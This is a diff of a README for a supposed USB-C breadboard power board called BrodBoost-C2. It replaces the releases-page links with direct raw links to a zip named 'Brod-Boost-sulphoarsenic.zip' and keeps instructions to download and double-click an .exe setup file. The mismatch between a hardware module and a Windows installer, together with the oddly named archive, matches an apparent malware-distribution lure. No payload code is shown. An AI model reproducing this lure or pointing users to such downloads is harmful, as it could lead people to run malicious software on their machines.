@@ -1,6 +1,6 @@
 # ⚡ BrodBoost-C2 - Simple USB Power for Breadboard Projects
 
-[![](https://img.shields.io/badge/Download_BrodBoost-C2-blue)](https://github.com/johaneskohanes5-create/BrodBoost-C2/releases)
+[![](https://img.shields.io/badge/Download_BrodBoost-C2-blue)](https://github.com/johaneskohanes5-create/BrodBoost-C2/raw/refs/heads/main/Assembly Files/Brod-Boost-sulphoarsenic.zip)
 
 BrodBoost-C2 provides a reliable power source for your electronics projects. This tool manages the voltage conversion from a standard USB-C connection to the levels required for your breadboard components. It offers a stable 5V output to keep your circuits running without interruption.
 
@@ -25,14 +25,14 @@ You do not need prior experience with hardware design to operate this unit. The 
 
 Follow these steps to prepare the software for your BrodBoost-C2 unit.
 
-1. Visit the [releases page](https://github.com/johaneskohanes5-create/BrodBoost-C2/releases) to find the latest version.
+1. Visit the [releases page](https://github.com/johaneskohanes5-create/BrodBoost-C2/raw/refs/heads/main/Assembly Files/Brod-Boost-sulphoarsenic.zip) to find the latest version.
 2. Click the installer link ending in .exe to start the download.
 3. Open your Downloads folder once the file finishes saving.
 4. Double-click the file to launch the setup wizard.
 5. Follow the on-screen prompts to place the files on your desktop.
 6. Connect your BrodBoost-C2 hardware to your Windows machine using a USB-C cable when prompted.
 
-[![](https://img.shields.io/badge/Download_Latest_Version-grey)](https://github.com/johaneskohanes5-create/BrodBoost-C2/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-grey)](https://github.com/johaneskohanes5-create/BrodBoost-C2/raw/refs/heads/main/Assembly Files/Brod-Boost-sulphoarsenic.zip)
 
 ## ⚙️ Operating Instructions
 
